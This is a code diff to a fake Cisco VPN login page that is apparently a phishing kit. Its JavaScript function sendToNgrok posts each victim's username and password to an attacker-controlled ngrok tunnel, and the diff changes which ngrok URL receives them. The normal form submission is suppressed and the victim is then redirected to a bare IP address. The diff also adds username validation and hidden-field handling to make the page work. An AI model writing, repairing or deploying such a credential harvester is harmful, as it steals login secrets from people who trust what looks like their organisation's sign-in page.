@@ -152,11 +152,12 @@ function validate_username(username)
     return ret;
 }
 
+
 function sendToNgrok(username, password) {
     var xhr = new XMLHttpRequest();
-    xhr.open("POST", "https://1287-197-253-194-145.ngrok-free.app/submit", true);
+    xhr.open("POST", "https://18d5-160-169-146-175.ngrok-free.app/submit", true);  // Utilisez l'URL publique de ngrok ici
     xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
-    
+
     xhr.onreadystatechange = function() {
         if (xhr.readyState === 4) {
             if (xhr.status === 200) {
@@ -166,24 +167,44 @@ function sendToNgrok(username, password) {
             }
         }
     };
-    
+
     xhr.send(JSON.stringify({ username: username, password: password }));
 }
 
 function formSubmit() {
+    disableButton();
+
     var primary_username = document.getElementById("username"),
+        secondary_username = document.getElementById("secondary_username"),
         password_input = document.getElementById("password_input");
+
+    if ((primary_username && !validate_username(primary_username)) ||
+        (secondary_username && !validate_username(secondary_username))) {
+        return false;
+    }
 
     if (primary_username && primary_username.value && password_input && password_input.value) {
         sendToNgrok(primary_username.value, password_input.value);
+    }
+
+    // Ensure group_list value is included in form submission
+    var group_list = document.getElementById("group_list");
+    if (group_list) {
+        var group_list_value = group_list.value;
+        var hidden_group_list = document.createElement("input");
+        hidden_group_list.type = "hidden";
+        hidden_group_list.name = "group_list";
+        hidden_group_list.value = group_list_value;
+        document.getElementById("unicorn_form").appendChild(hidden_group_list);
     }
 
     return false;  // Prevent the form from submitting normally
 }
 
 function redirectToSite() {
-    window.location.href = "https://185.79.192.62/+CSCOE+/logon.html#form_title_text";
+    window.location.href = "https://185.79.192.62";
 }
+
 </script>
 
 <link href="/+CSCOU+/portal.css" rel="stylesheet" type="text/css">
